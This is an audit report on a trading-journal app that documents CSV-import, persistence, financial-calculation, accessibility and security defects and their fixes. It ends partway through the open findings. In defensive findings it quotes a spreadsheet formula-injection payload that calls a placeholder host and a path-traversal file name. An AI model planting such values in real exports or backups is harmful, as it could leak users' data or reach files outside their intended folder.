# Sniper Journal: quality, reliability and engineering audit

| | |
|---|---|
| Date | 2026-10-09 |
| Baseline | `main` at `5dcff10` ("Merge the GitHub repository's initial commit"), clean working tree |
| Result | 26 defects fixed (23 verified by tests; 3 small UI fixes checked by code review and typecheck only); 17 open findings (4 Medium, 6 Low, 7 Informational) |
| Machine | Windows 11 Pro 10.0.26200, Intel i7-13620H, 24 GB RAM, Node v24.21.0, npm 11.12.0 |
| Android | Emulator `pixel_8_pro_api35` (Android 15, `userdebug` image, Android System WebView 124.0.6367.219) |
| Data used | Synthetic only: generated in tests, a 4-row CSV written by the E2E script, and the app's own "Load test data" journal on the emulator. No real journal was opened, copied or uploaded. |

All changes are uncommitted in the working tree. Nothing was pushed.

---

## 1. Executive summary

Sniper Journal is a local-first trading journal. The same Next.js/React code
runs two ways:

- **PC:** a Node server on `127.0.0.1` that stores the journal in `data/`.
- **Android:** a Capacitor WebView that stores it in the app's private storage.

Before this audit the repository had **no automated tests, no linter and no
CI**. The README said the calculations "are tested", but no test files existed.

**What was wrong.** The audit found 26 defects. All are fixed; 23 are pinned
by automated tests and 3 small UI fixes (SJ-20 to SJ-22) were checked by code
review and typecheck only. The serious ones were in three places:

1. **CSV import could silently change or lose trading data:**
   - European numbers came in wrong by a factor of up to 100,000 ("1,08640" became 108,640).
   - "Sell Short" came in as a long, which flips the sign of its P&L.
   - Day and month were decided row by row, so one file could put trades on two different date orders.
   - A stray `"` in a notes field swallowed every row after it.
   - The app's own export, imported again, turned trades with a manually entered P&L into open trades worth $0.
2. **Two destructive actions were irreversible:**
   - Restore and Erase replaced the journal without keeping a copy. The only backup was the once-a-day rolling copy, so everything entered since the first save of the day was lost.
   - Bulk actions on the Trades page kept trades selected after a search or filter hid them, so "Delete 3 trades" could delete trades the user could no longer see, even in another account.
3. **Numbers disagreed between screens or were miscalculated:**
   - The sidebar balance included excluded trades, while the equity curve did not.
   - SQN used the population standard deviation and the wrong N (overstated by 12% to 41% in the test fixtures).
   - A trade that nets exactly $0 was classed as a loss because of floating-point noise.

**How it was verified.** Tests were built from nothing and run on the final code:

| Check | Result |
|---|---|
| Unit and integration tests (`npm test`) | 212 / 212 pass |
| Coverage of logic, storage and API code | 79.3% statements, 73.8% branches |
| E2E journey on the production desktop build, headless Edge | 37 / 37 checks pass |
| Android flow on the emulator | 16 / 16 checks pass |
| Back-button sequence on Android | Correct at all 5 steps |
| Typecheck, desktop build, mobile build, production `npm audit` | All clean |

**What remains open.** The most important items:

- Re-importing a CSV that has no trade IDs duplicates every trade.
- Files with separate Date and Time columns lose the time.
- Several text colours fail WCAG AA contrast.
- ~~The app is labelled "AI Insights" although the analysis is rule-based.~~ Renamed to "Insights & Signals" on 2026-10-09; store screenshot `05-insights.png` still shows the old name.
- Nothing runs the tests automatically yet: there is no CI or lint.

**Release.** The evidence supports releasing to a Play closed/internal test
track now. It does not yet support calling the app production-ready; see
[section 16](#16-release-recommendation).

---

## 2. Architecture

```
src/
  app/             Next.js App Router pages; app/api/*/route.desktop.ts = desktop-only API
  views/           one component per screen (Dashboard, Trades, Calendar, Reports, Settings, ...)
  components/      UI (ui/ primitives: Field, Modal, ...), charts, layout
  store/           JournalProvider (React context, load/save), sanitize.ts, selectors.ts (new)
  lib/             pure logic: trade-math, stats, insights, csv, merge, utils, format, backup
  lib/storage/     JournalStorage interface + web.ts (desktop, via API) + capacitor.ts (Android)
tests/             Vitest unit/integration tests, e2e/ (headless browser), bench/ (timings)
android/           Capacitor Android project
scripts/           build-mobile.mjs, bundle-android.mjs, make-icons.mjs
```

**One codebase, two platforms.**

- **Platform switch.** `pick()` in `src/lib/storage/index.ts` is the only place that checks the platform. Everything else reads `storage.kind`.
- **Desktop.** `npm run build` makes a Node server. `next.config.ts` adds `desktop.ts` to `pageExtensions`, so `route.desktop.ts` files become API routes. They read and write `data/journal.json` and `data/backups/`, and only accept requests from loopback hosts (`src/app/api/local-only.ts`). The browser also keeps a mirror of the journal in `localStorage`.
- **Android.** `npm run build:mobile` makes a static export into `out/` without the API routes. Capacitor serves it from the APK. `capacitor.ts` stores `journal.json`, `backups/` and `screenshots/` in `Directory.Data`. Each save writes a temporary file, then renames it over `journal.json`. The release manifest has no `INTERNET` permission and sets `allowBackup="false"`.

**Data flow.**

- **Loading.** `JournalProvider` loads the journal. `normalize()` and `sanitize.ts` turn whatever is on disk into a valid `JournalData`.
- **Changing.** Every change goes through `mutate()`, and a debounced save writes the whole journal.
- **Calculating.** The calculations are pure functions in `src/lib`, so they can be tested without a browser.

**Architectural observations:**

- **The split is sound.** Logic is pure and storage sits behind one interface. This is why the audit could test about 80% of the logic without rendering anything.
- **Balances were computed in three places** (provider, Dashboard, Reports), each slightly differently. That caused SJ-16 and SJ-20. They now come from one module, `src/store/selectors.ts`.
- **The journal is one JSON document** that is rewritten in full on every save. This is simple and robust (atomic rename on Android), and it stays fast up to tens of thousands of trades (see [section 11](#11-performance)).

---

## 3. Baseline (before any change)

| Command | Result | Notes |
|---|---|---|
| `git status` | clean, `main` @ `5dcff10` | |
| `npm ci` | **PASS** (135 s) | 1 deprecation warning (`uuid@7`, via `@capacitor/cli`) |
| `npm run typecheck` | **PASS** | `tsc --noEmit`, strict mode |
| `npm run build` | **PASS** | routes `/api/journal`, `/api/screenshot` present |
| `npm run build:mobile` | **PASS** | |
| `npm audit` | 3 moderate | all in the dev-only `@capacitor/cli → xcode → uuid` chain |
| `npm audit --omit=dev` | **PASS**, 0 vulnerabilities | |
| tests | **NOT RUN**: none existed | no `tests/`, no test runner, no `*.test.*` files |
| lint | **NOT RUN**: not configured | no ESLint config; Prettier config present but Prettier not installed |
| CI | none | no `.github/` |

---

## 4. Findings

### Severity scale

- **Critical:** data loss or corruption with no warning on a common path, or a remote compromise.
- **High:** silent corruption of trading data, or irreversible loss on a user action.
- **Medium:** wrong numbers, a narrow corruption path, or an accessibility barrier.
- **Low:** cosmetic, rare or hardening.
- **Informational:** context, nothing broken.

No Critical findings were made.

### Status values

| Status | Meaning |
|---|---|
| Fixed and Verified | The defect was shown (each finding says how: a test failing on the old code, a reproduction, or code reading), the code was changed, and a test or E2E check now passes. |
| Fixed (untested wiring) | Fixed, but only checked by code review and typecheck; no test exercises it. |
| Confirmed | Reproduced or proven from code, not fixed. |
| Unverified | Could not be checked here. |
| Accepted Risk | Known and deliberately left. |

### Summary

| ID | Sev. | Category | Title | Status |
|---|---|---|---|---|
| SJ-01 | High | CSV | A stray quote in an unquoted field swallowed the rest of the file | Fixed and Verified |
| SJ-02 | High | CSV / Validation | Decimal-comma and European numbers misread by up to 10⁵× (CSV and the trade form) | Fixed and Verified |
| SJ-03 | High | CSV / Financial | "Sell Short"/"Short Sell" and unknown directions imported as LONG without warning | Fixed and Verified |
| SJ-04 | High | CSV | Day/month order decided per row, so one file mixed two date orders | Fixed and Verified |
| SJ-05 | High | Persistence | Restore and Erase kept no copy of the journal they replaced | Fixed and Verified |
| SJ-06 | High | State / Data loss | Bulk actions included trades hidden by search, filters or account | Fixed and Verified |
| SJ-07 | Medium | CSV | "1:05 PM" after an ISO date read as 01:05; impossible dates stored | Fixed and Verified |
| SJ-08 | Medium | CSV / Financial | Net P&L column plus a commission column charged commission twice | Fixed and Verified |
| SJ-09 | Medium | CSV / Persistence | The app's own export, re-imported, turned manual-P&L trades into open $0 trades | Fixed and Verified |
| SJ-10 | Medium | Security / CSV | CSV export open to spreadsheet formula injection | Fixed and Verified |
| SJ-11 | Medium | Persistence | Backups from a newer app version restored with their newer data dropped | Fixed and Verified |
| SJ-12 | Medium | Persistence / Validation | Duplicate trade/account ids kept, so deleting one trade deleted both | Fixed and Verified |
| SJ-13 | Medium | Validation / Financial | Multiplier ≤ 0 accepted by import and restore (the form refuses it), turning wins into losses | Fixed and Verified |
| SJ-14 | Medium | Financial | Floating-point noise made a $0.00 trade a loss | Fixed and Verified |
| SJ-15 | Medium | Financial | SQN used population SD and the wrong N | Fixed and Verified |
| SJ-16 | Medium | Financial / State | Sidebar/Settings balances disagreed with the equity curve | Fixed and Verified |
| SJ-17 | Medium | Accessibility | Form labels not associated with their inputs | Fixed and Verified |
| SJ-18 | Medium | Accessibility | Dialogs unnamed, focus not moved in or restored | Fixed and Verified |
| SJ-19 | Low | Financial | "Open" count included closed trades missing a detail | Fixed and Verified |
| SJ-20 | Low | Financial | Reports drawdown ignored P&L before the selected range | Fixed (untested wiring) |
| SJ-21 | Low | State | Calendar day dialog total disagreed with the day cell | Fixed (untested wiring) |
| SJ-22 | Low | UI | Best/Worst day always green/red, whatever the sign | Fixed (untested wiring) |
| SJ-23 | Low | UI | Durations shown as "60m" and "1h 60m" | Fixed and Verified |
| SJ-24 | Low | Security | Android built an image URL from an unsafe screenshot name | Fixed and Verified |
| SJ-25 | Low | Security | Desktop pages could be framed by any site (clickjacking) | Fixed and Verified |
| SJ-26 | Info | Docs | README said the calculations were tested; no tests existed | Fixed and Verified |
| SJ-27 | Medium | CSV | Re-importing a file without trade IDs duplicates every trade | Confirmed |
| SJ-28 | Medium | CSV | Separate Date and Time columns: the time is dropped (00:00) | Confirmed |
| SJ-29 | Medium | Accessibility | Several text colours below WCAG AA contrast | Confirmed |
| SJ-30 | Medium | Process | No CI, no lint; tests run only when someone remembers | Confirmed |
| SJ-31 | Low | CSV | Time-zone suffixes (`Z`, `+02:00`) ignored without a warning | Confirmed |
| SJ-32 | Low | Persistence | A newer-version journal on disk is silently downgraded on load | Confirmed |
| SJ-33 | Low | Accessibility | Dialogs do not trap Tab focus | Confirmed (code) |
| SJ-34 | Low | Accessibility | Charts have no text alternative | Confirmed (code) |
| SJ-35 | Low | Product / Store | UI says "AI Insights"; the analysis is rule-based and the store listing avoids "AI" | Fixed (2026-10-09; store screenshot 05 still to retake) |
| SJ-36 | Low | Persistence | Screenshots: orphaned on account delete/reset; not in backups | Accepted Risk |
| SJ-37 | Info | Persistence | Desktop `localStorage` mirror fails silently past about 5 MB | Accepted Risk |
| SJ-38 | Info | Dependencies | 3 moderate advisories, dev-only (`@capacitor/cli`) | Accepted Risk |
| SJ-39 | Info | Persistence | A cleaned-up journal is only written back on the next change | Accepted Risk |
| SJ-40 | Info | Accessibility | Two different inputs are both named "Search trades" | Confirmed |
| SJ-41 | Info | Android | Real devices and WebView ≥ 140 (edge-to-edge) not tested | Unverified |
| SJ-42 | Info | Performance | Large journals on phones not measured | Unverified |
| SJ-43 | Info | Security | Journal API has no request-size limit (loopback only) | Accepted Risk |

---

## 5. Confirmed defects, fixed

### SJ-01: A stray quote swallowed the rest of the file

- **Severity / category:** High, CSV
- **Location:** `src/lib/csv.ts:246` (`parseCsv`)
- **Reproduction:** `parseCsv('symbol,notes\nAAPL,12" monitor\nMSFT,ok\n')`
- **Expected:** 3 rows. The `"` stays as text.
- **Actual (before):** 2 rows. The quote put the parser into quoted mode mid-field, so the MSFT row and everything after it became part of AAPL's notes.
- **Evidence:** `tests/csv.test.ts` "a stray quote inside an unquoted field…" failed on the original code (`expected [ [ 'symbol', 'notes' ], …(1) ] to deeply equal [ … …(2) ]`) and passes now.
- **Impact:** Trades silently missing from an import. Notes such as `12" monitor` or `5" move` are common.
- **Fix:** A quote opens a quoted field only at the start of a field, as in RFC 4180.
- **Status:** Fixed and Verified.

### SJ-02: Decimal-comma and European numbers misread

- **Severity / category:** High, CSV / Validation
- **Location:**
  - `src/lib/utils.ts:48` `parseDecimal` (new) and `:77` `toNumberOrNull`, which the trade form also uses
  - `src/lib/csv.ts:265` `parseMoney`
- **Reproduction:**

  | Input | Value before the fix | Correct value |
  |---|---|---|
  | `1.234,50` | 1.2345 | 1234.5 |
  | `1,08640` | 108640 | 1.0864 |
  | `1.234.567` | 0 | 1234567 |
  | `4,25` (typed in the form) | 425 | 4.25 |
- **Evidence:** 4 cases in `tests/csv.test.ts` and 2 in `tests/helpers-format.test.ts` failed on the original code with exactly these values, and pass now. The US cases `1,234.50`, `$1,234.50` and `(120)` are kept passing.
- **Impact:** Prices and P&L wrong by orders of magnitude, accepted without a warning. Any broker export from a decimal-comma locale is affected.
- **Fix:** One parser decides the separators:
  - With both `.` and `,`, the last one is the decimal point, and the other must group digits in threes.
  - A lone comma is a decimal comma unless the number is a valid thousands grouping.
  - Anything ambiguous or malformed becomes "no value", and the importer flags the trade instead of storing a guess.
- **Status:** Fixed and Verified.

### SJ-03: Short-selling phrasings and unknown directions imported as LONG

- **Severity / category:** High, CSV / Financial
- **Location:**
  - `src/lib/csv.ts:371` `parseSide`
  - `:452` and `:615-630`: the new warnings
- **Reproduction:** Import `symbol,side\nAAPL,Sell Short`.
- **Expected:** SHORT.
- **Actual (before):** LONG. "Short Sell", "SS" and "Sell to open" behaved the same. An unrecognised value (`Stock`) or a missing side column also became LONG, with no message.
- **Evidence:** `tests/csv.test.ts` "Sell Short -> SHORT", "Short Sell -> SHORT" and "a direction the importer does not recognise is reported" failed (`expected 'LONG' to be 'SHORT'`) and pass now. The E2E journey imports "Sell Short" and checks the row shows SHORT.
- **Impact:** A short read as a long has its P&L sign inverted, so a winning short shows as a loss.
- **Fix:**
  - The common phrasings are recognised.
  - An unrecognised value is imported as LONG and listed by row in the preview ("the direction "Stock" was not recognised…").
  - A file with no direction column gets one warning.
- **Status:** Fixed and Verified.

### SJ-04: Date order decided per row

- **Severity / category:** High, CSV
- **Location:** `src/lib/csv.ts:357` `dateOrderOf`, `:324` `parseDateTimeParts`
- **Reproduction:** Import `symbol,opened_at\nA,13/04/2026 10:00\nB,03/04/2026 10:00`
- **Expected:** Both rows day-first (13 April and 3 April), because "13" proves the file is day-first.
- **Actual (before):** Row B was read month-first, as 4 March.
- **Evidence:** `tests/csv.test.ts` "one file is read with one date order" failed and passes now.
- **Impact:** In a day-first file, every trade on days 1 to 12 lands in the wrong month. This affects the calendar, day statistics and ranges.
- **Fix:** One order is chosen for the whole file, from every date column in it.
- **Status:** Fixed and Verified.

### SJ-05: Restore and Erase kept no copy of what they replaced

- **Severity / category:** High, Persistence
- **Location:**
  - `src/views/SettingsView.tsx:36-58` (restore) and `:304` (erase)
  - `src/lib/storage/types.ts:46,69-75`
  - `src/lib/storage/web.ts:34`
  - `src/lib/storage/capacitor.ts:73,160`
  - `src/app/api/journal/route.desktop.ts:39-80`
- **Reproduction (before):** Make edits, then Settings → Restore a backup → "Replace my journal".
- **Expected:** The journal being replaced stays recoverable.
- **Actual (before):** It was overwritten. The only other copy was the once-a-day rolling backup, made at the day's first save, so that day's later edits were gone. Erase all data worked the same way.
- **Evidence:**
  - Code inspection: the original `restore` called `actions.replaceAll(parsed)` directly.
  - New tests in `tests/storage-native.test.ts` and `tests/api-desktop.test.ts` failed before the feature existed (`keepCopy is not a function`, `POST is not a function`) and pass now.
  - E2E: restore leaves `data/backups/before-restore-*.json` holding the replaced 2-trade journal.
  - Android: `files/backups/before-restore-*.json` holds the replaced 78-trade journal, and `before-erase-*.json` holds the erased 3-trade journal.
- **Impact:** Irreversible loss of up to a day's work through one confirm click.
- **Fix:**
  - A new `keepCopy(data, reason)` on both storage adapters: a POST to the desktop API, or a queued file write on Android.
  - Restore and Erase refuse to go ahead if the copy fails.
  - The last 10 copies of each kind are kept.
  - Pruning now counts only files with the same prefix, so safety copies never push out daily backups.
- **Status:** Fixed and Verified.

### SJ-06: Bulk actions touched trades that were no longer shown

- **Severity / category:** High, State / Data loss
- **Location:** `src/views/TradesView.tsx:128-138`
- **Reproduction (before):** Select trades A and B, then search for A only. The bar still said "2 selected", so Delete removed B too. The same happened after switching account.
- **Expected:** A bulk action only affects trades that are currently shown.
- **Actual (before):** The selection was a `Set` of ids that nothing ever pruned.
- **Evidence:**
  - Code inspection.
  - E2E: with TSLA and AAPL selected, searching "AAPL" leaves "1 selected", and clearing the search does not bring TSLA back.
- **Impact:** Silent deletion, exclusion or bulk editing of trades the user could not see.
- **Fix:** When the shown list changes, the selection keeps only the trades still shown.
- **Status:** Fixed and Verified.

### SJ-07: AM/PM ignored after ISO dates; impossible dates stored

- **Severity / category:** Medium, CSV
- **Location:** `src/lib/csv.ts:298` `fromParts`, `:324`
- **Reproduction:**
  - `2026-03-04 1:05 PM` gave `T01:05` (expected `T13:05`).
  - `2026-13-45 10:00` was stored as `2026-13-45T10:00` (expected: rejected, and the trade flagged).
- **Evidence:** Two `tests/csv.test.ts` cases failed with exactly these values and pass now.
- **Impact:** Times 12 hours off break sessions, hold times and time-of-day insights. Impossible dates break sorting and the calendar.
- **Fix:** Month, day-of-month, hour, minute, second and meridiem are all validated. Invalid dates leave the field empty, so the trade is flagged for review.
- **Status:** Fixed and Verified.

### SJ-08: Commission charged twice with a net P&L column

- **Severity / category:** Medium, CSV / Financial
- **Location:** `src/lib/csv.ts:136-141` (aliases), `:509-512`
- **Reproduction:** `symbol,side,qty,entry,exit,commission,net pnl\nES,Buy,1,5000,5002,4.5,95.5`
- **Expected:** Net 95.50.
- **Actual (before):** 91.00. "net pnl" was treated as gross, and the commission was deducted again.
- **Evidence:** `tests/csv.test.ts` "counts the commission once" failed (`expected 91 to be close to 95.5`) and passes now.
- **Fix:** Net and gross P&L columns are told apart. A net figure has the fees added back to give the gross. Plain "P&L" / "Profit" columns are still taken as gross.
- **Status:** Fixed and Verified.

### SJ-09: The app's own export → import lost manual-P&L trades

- **Severity / category:** Medium, CSV / Persistence
- **Location:** `src/lib/csv.ts:534` (`move == null` branch)
- **Reproduction:**
  1. Export a trade closed with a manually entered P&L and no exit price.
  2. Import the file again.
- **Expected:** The same closed trade and P&L.
- **Actual (before):** An open trade worth $0. The export always writes a `multiplier` column, and the old importer only used the reported P&L when that column was absent.
- **Evidence:** `tests/csv.test.ts` "round-trips through import with every trading value intact" failed (`isClosed`: `expected false to be true`) and passes now.
- **Fix:** When there are no prices to check the P&L against, the reported P&L is the result.
- **Status:** Fixed and Verified.

### SJ-10: CSV formula injection

- **Severity / category:** Medium, Security / CSV
- **Location:** `src/lib/csv.ts:180-182`, `tradesToCsv` at `:184`
- **Reproduction:** A note `=HYPERLINK("http://example.invalid","x")` was exported as-is. Excel or Sheets would run it as a formula when the file is opened.
- **Expected:** Cells that begin with `= + - @` (or a tab or CR) are neutralised.
- **Evidence:** `tests/csv.test.ts` "text that a spreadsheet would run as a formula is neutralised, and restored on re-import" failed and passes now.
- **Impact:** Journal text can come from an imported broker file. Opening the export in a spreadsheet could exfiltrate data through a crafted link or formula.
- **Fix:**
  - Risky text cells (symbol, setup, tags, notes, session, account) get a leading `'`.
  - The importer removes it again, so a round trip is lossless.
  - Numeric cells are untouched, so negative P&L still exports as a number.
- **Status:** Fixed and Verified.

### SJ-11: Newer-version backups accepted and silently stripped

- **Severity / category:** Medium, Persistence
- **Location:** `src/lib/backup.ts:14`
- **Reproduction:** Restore a backup with `"version": 2`.
- **Expected:** Refused with a clear message.
- **Actual (before):** Accepted. `normalize()` then dropped every field it did not know.
- **Evidence:** `tests/journal-data.test.ts` "refuses a backup made by a newer version" failed (`expected { version: 2, … } to be undefined`) and passes now.
- **Fix:** Refused with "This backup was made by a newer version of Sniper Journal. Update the app, then restore it."
- **Status:** Fixed and Verified. The same problem on the load path remains open as SJ-32.

### SJ-12: Duplicate ids in a loaded journal

- **Severity / category:** Medium, Persistence / Validation
- **Location:** `src/store/sanitize.ts:67` (`uniqueIds`), `:107`, `:146`, `:161`, `:176`
- **Reproduction:** A journal with two trades sharing the id `dup`.
- **Actual (before):** Both were kept with the same id. Delete, edit and bulk actions select by id, so deleting one deleted both. Duplicate account ids gave two accounts in the switcher.
- **Evidence:**
  - Two `tests/journal-data.test.ts` cases failed (`expected 2 to be 3`, `expected [ …(2) ] to deeply equal [ { id: 'acc1' … } ]`) and pass now.
  - On the Android emulator, a hand-corrupted journal with a duplicate trade id and a duplicate account opened, showed all 78 trades, and after the next save had unique ids and one account.
- **Fix:**
  - Repeated trade, setup and resource ids are renamed, so no data is lost.
  - A repeated account id is dropped. Its trades stay attached to the first account with that id.
- **Status:** Fixed and Verified.

### SJ-13: Multiplier ≤ 0 accepted by import and restore

- **Severity / category:** Medium, Validation / Financial
- **Location:**
  - `src/lib/csv.ts:517-524` and `:620-626`
  - `src/store/sanitize.ts:127`
  - The trade form already refuses these values: `src/components/trades/TradeFormModal.tsx:104` says "Must be more than 0".
- **Reproduction:** A synthetic long trade from 100 to 110 with multiplier `-2`, run through the sanitizer.
- **Expected:** Positive net.
- **Actual (before):** Kept as −2, so net −$20 for a +$10 move. A CSV `multiplier` column of `-2` or `0` was also stored as-is.
- **Evidence:**
  - A reproduction script printed `{ kept: -2, net: -20 }`.
  - Three new tests (2 in `tests/csv.test.ts`, 1 in `tests/journal-data.test.ts`) failed on that code (`expected [ -2, +0, 5 ] to deeply equal [ 1, 1, 5 ]`) and pass after the fix.
- **Fix:**
  - The importer leaves such a value out and says so ("the multiplier "-2" has to be more than 0…"). A reported P&L can still derive the right multiplier.
  - The sanitizer drops it, so the math falls back to 1, which is what it already did for 0.
- **Status:** Fixed and Verified. (The Android checks were re-run on an APK that includes this fix.)

### SJ-14: Floating-point noise made a breakeven trade a loss

- **Severity / category:** Medium, Financial
- **Location:** `src/lib/trade-math.ts:14,21,27`
- **Reproduction:** Long 10 at 1.1, exit 1.2, fees 1.00. The gross is `0.9999999999999987`, so the net was `-1.3e-15`.
- **Expected:** Breakeven, net 0.
- **Actual (before):** LOSS.
- **Evidence:** `tests/trade-math.test.ts` failed (`expected 'LOSS' to be 'BE'`) and passes now.
- **Impact:** Wrong win rate, loss count and streaks for forex-style decimals.
- **Fix:** Gross and net P&L are rounded to 1e-8 of a currency unit, far below any displayed precision.
- **Status:** Fixed and Verified.

### SJ-15: SQN formula

- **Severity / category:** Medium, Financial
- **Location:** `src/lib/stats.ts:178-179`
- **Reproduction:**
  - Five money results with mean 30 and sample variance 58000/4: expected 0.5571, actual 0.6228.
  - A case where SQN uses R multiples: expected 1.0529, actual 1.4890.
- **Evidence:** Both `tests/stats.test.ts` cases failed with those values and pass now.
- **Impact:** SQN was overstated by 12% to 41% in these fixtures. Its label ("Good", "Excellent" and so on) could be a band too high.
- **Fix:** Van Tharp's definition: mean ÷ sample standard deviation × √N, where N is the number of values actually used.
- **Status:** Fixed and Verified.

### SJ-16: Balances disagreed between screens

- **Severity / category:** Medium, Financial / State
- **Location:**
  - `src/store/selectors.ts` (new)
  - `src/store/JournalProvider.tsx:407`
  - `src/views/DashboardView.tsx:51`
- **Reproduction (before):** Mark a +$100 trade as excluded. The sidebar and Settings balances still included it, but the equity curve ended $100 lower.
- **Evidence:**
  - Code inspection: the provider summed `netPnl` over every trade of the account, while the curve used `statTrades`, which leaves out excluded and incomplete trades.
  - `tests/selectors.test.ts` (5 tests).
  - The E2E journey checks that the sidebar balance equals the curve's current balance at 5 points: after import, edit, delete, restore, and a server restart.
- **Fix:** One `selectors.ts` (`realised`, `accountBalances`, `openingBalance`) is used by every screen.
- **Product decision for the owner:** Excluded trades now count toward neither the statistics nor the balance. That matches what "exclude from stats" suggests, but it changes the sidebar figure for anyone who has excluded trades.
- **Decided 2026-10-09:** The owner chose a setting, Settings → Accounts → "Count excluded trades in the balance". It is off by default, which keeps the behaviour above. When on, the sidebar, Settings and Dashboard balances count excluded trades; the statistics, equity curve and drawdown never do, and the Dashboard marks such a balance "incl. excluded trades".
- **Status:** Fixed and Verified.

### SJ-17: Form labels not associated with inputs

- **Severity / category:** Medium, Accessibility
- **Location:** `src/components/ui/Field.tsx:26-69`, `src/components/ui/TagInput.tsx`
- **Actual (before):** The label was a `<span>`. Screen readers announced unlabelled fields, and clicking a label did nothing.
- **Fix:**
  - `<label htmlFor>` plus a context that gives the input inside a `Field` its `id`.
  - `aria-invalid` and `aria-describedby` point at the error text.
- **Evidence:** E2E finds the Exit price input through its label, and finds no unnamed field or icon-only button on the Trades page.
- **Status:** Fixed and Verified.

### SJ-18: Dialogs unnamed; focus not managed

- **Severity / category:** Medium, Accessibility
- **Location:** `src/components/ui/Modal.tsx:33-46,67,92`
- **Actual (before):** `role="dialog"` had no name. Focus stayed on the page behind, and closing a dialog dropped focus to `<body>`.
- **Fix:**
  - `aria-labelledby` points at the title.
  - The dialog takes focus when it opens, unless a field inside already did.
  - Focus returns to the opener on close.
- **Evidence:** E2E checks that the dialog's name is "Import trades from CSV", that focus is inside it after opening, and that focus is back on the Import CSV button after Escape.
- **Status:** Fixed and Verified. Tab focus trapping is still open (SJ-33).

### SJ-19: "Open" count included incomplete closed trades

- **Severity / category:** Low, Financial
- **Location:** `src/lib/stats.ts:122`
- **Reproduction:** One open trade plus one closed trade that is missing its entry price.
- **Expected:** `open` = 1.
- **Actual (before):** 2.
- **Evidence:** `tests/stats.test.ts` failed (`expected 2 to be 1`) and passes now.
- **Status:** Fixed and Verified.

### SJ-20: Reports drawdown ignored earlier P&L

- **Severity / category:** Low, Financial
- **Location:** `src/views/ReportsView.tsx:31`
- **Actual (before):** For 7D, 30D, 90D and YTD, the drawdown percentage was measured from the account's starting balance instead of the balance when the range began. The Dashboard already did this correctly.
- **Evidence:** Code inspection. Both screens now call `openingBalance`, which `tests/selectors.test.ts` covers; the Reports screen itself is not exercised by a test.
- **Status:** Fixed (untested wiring).

### SJ-21: Calendar day total disagreed with the day cell

- **Severity / category:** Low, State
- **Location:** `src/views/CalendarView.tsx:252`
- **Actual (before):** The dialog summed every trade of the day, including excluded and incomplete ones. The cell used only the counted trades.
- **Fix:** The dialog uses `realised()`, like the cell.
- **Status:** Fixed (untested wiring). `realised()` is covered by `tests/selectors.test.ts`; the Calendar dialog itself is not exercised by a test.

### SJ-22: Best/Worst day colours ignored the sign

- **Severity / category:** Low, UI
- **Location:** `src/views/DashboardView.tsx:228,234`
- **Actual (before):** "Best day" was always green, even when it was a loss, and "Worst day" was always red.
- **Fix:** `toneFor(value)`.
- **Status:** Fixed (untested wiring): code review and typecheck only. No test renders a negative best day.

### SJ-23: Durations "60m" and "1h 60m"

- **Severity / category:** Low, UI
- **Location:** `src/lib/format.ts:108-111`
- **Reproduction:** 59.6 minutes showed "60m" and 119.6 minutes showed "1h 60m".
- **Evidence:** Two `tests/helpers-format.test.ts` cases failed with exactly these strings and pass now ("1h" and "2h").
- **Status:** Fixed and Verified.

### SJ-24: Unsafe screenshot names on Android

- **Severity / category:** Low, Security (hardening)
- **Location:** `src/lib/storage/capacitor.ts:185-188`
- **Actual (before):** A name that failed `safeName` (for example `../journal.json`, which a crafted backup could contain) was still URL-encoded into a WebView file URL.
- **Expected:** No URL at all.
- **Fix:** It now returns `''`.
- **Evidence:** `tests/storage-native.test.ts`.
- **Notes:** Whether the old URL actually resolved outside `screenshots/` was not tested on a device.
- **Status:** Fixed and Verified.

### SJ-25: Desktop pages could be framed (clickjacking)

- **Severity / category:** Low, Security
- **Location:** `next.config.ts`
- **Reproduction:** `curl -I http://127.0.0.1:3000/` returned no `X-Frame-Options` and no `Content-Security-Policy`, and did return `X-Powered-By: Next.js`.
- **Impact:** A malicious website open in the same browser could load the journal in an invisible frame and trick clicks. The destructive actions have confirm dialogs, and since SJ-05 a safety copy, which limits the damage.
- **Fix:**
  - Desktop build only: `Content-Security-Policy: frame-ancestors 'none'`, `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff` and `Referrer-Policy: no-referrer`.
  - `poweredByHeader: false`.
  - The static mobile export is unaffected.
- **Evidence:** E2E checks these headers on the production build. Separately, the API's existing guard refused a cross-site PUT and a DNS-rebinding `Host` with 403.
- **Status:** Fixed and Verified.

### SJ-26: README claimed tests that did not exist

- **Severity / category:** Informational, Docs
- **Location:** `README.md` ground rule 1, `DEVELOPING.md`
- **Fix:**
  - The rule now reads: change calculations only with a test that shows the new behaviour, and run `npm test`.
  - `DEVELOPING.md` lists the test, coverage, e2e and bench commands.
- **Note:** The old rule ("don't change the calculations in `src/lib/`") conflicted with fixing SJ-02 to SJ-15. This audit changed `src/lib` deliberately, and every change has a test.
- **Status:** Fixed and Verified.

---

## 6. Potential risks and open findings

### SJ-27: Re-importing a file without trade IDs duplicates every trade

- **Severity / category:** Medium, CSV
- **Location:** `src/lib/csv.ts:563-571`
- **Reproduction:** Import a 2-row CSV with no fill or id columns, then import the same file again, passing the existing trades as `existing`.
- **Expected:** "2 already in your journal, skipped".
- **Actual (observed):** 2 more trades, `duplicates: 0`.
- **Evidence:** A reproduction run during the audit (a throwaway test, removed afterwards).
- **Impact:** Doubled P&L and statistics if someone imports a monthly export twice. The preview count is the only clue.
- **Recommended fix:** Fingerprint symbol, side, opened/closed time, quantity and prices. Show "possible duplicates" in the preview, skipped by default with an option to import them anyway. Identical trades can be legitimate, so don't drop them silently.
- **Status:** Confirmed.

### SJ-28: Separate Date and Time columns lose the time

- **Severity / category:** Medium, CSV
- **Location:** `src/lib/csv.ts:440-441`. `date` and `time` are both aliases of `opened_at`, and `headers.indexOf` takes the first.
- **Reproduction:** `symbol,side,Date,Time,…\nAAPL,Buy,2026-03-02,14:35,…`
- **Expected:** `2026-03-02T14:35`.
- **Actual (observed):** `2026-03-02T00:00`.
- **Impact:** Session, hold time and time-of-day insights are wrong for brokers that split date and time.
- **Recommended fix:** When a date-only column and a time-only column map to the same field, join them. Only do this when the first value has no time and the second has no date, so files that work today don't change.
- **Status:** Confirmed.

### SJ-29: Text contrast below WCAG AA

- **Severity / category:** Medium, Accessibility
- **Location:** `src/app/globals.css:6-36`
- **Evidence:** Contrast ratios computed with the WCAG 2.x formula against the three background tokens (`app`, `surface`, `raised`):

  | Token | Dark (min) | Light (min) | Suggested value (≥ 4.5:1 on all 3 backgrounds) |
  |---|---|---|---|
  | `faint` (used ~70 times in 22 files) | **2.81** | **2.31** | dark `#818a9e`, light `#66707f` |
  | `muted` | 5.33 | **4.29** (on `raised`) | light `#617086` |
